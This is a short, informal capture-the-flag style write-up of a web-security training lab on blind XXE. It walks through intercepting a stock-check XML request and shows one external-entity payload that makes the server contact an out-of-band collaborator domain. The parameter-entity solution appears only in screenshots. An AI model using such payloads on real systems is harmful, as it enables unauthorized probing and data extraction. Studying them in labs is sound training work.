# [XXE] Lab: Blind XXE with out-of-band interaction via XML parameter entities (1)

---

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled.png)

lets first go to the check stock feature and lets try to capture the request that is sending the XML document. 

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled%201.png)

let send that repeater and try to manipulate the request. and define our own external XML entity. 

lets start up the collaborator and launch try to have the XML entity issue a DNS request to our server 

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled%202.png)

payload:

 <!DOCTYPE foo [ <!ENTITY test SYSTEM "[http://bm1wpx45xwrxl4uziazaaqpcw32uqke9.oastify.com](http://bm1wpx45xwrxl4uziazaaqpcw32uqke9.oastify.com/)"> ]>

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled%203.png)

so in this case we can we can see that external entities are blacklisted so one of the thing we’re going o have to use XML parameter entity, which is a entity that is defined with the !ENTITY key word and is done within the DTD. 

**Like this:** 

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled%204.png)

And there we have it lab solved: 

![Untitled](%5BXXE%5D%20Lab%20Blind%20XXE%20with%20out-of-band%20interaction%20v%201c7c49ea251c451ea43e80fc0b522fb3/Untitled%205.png)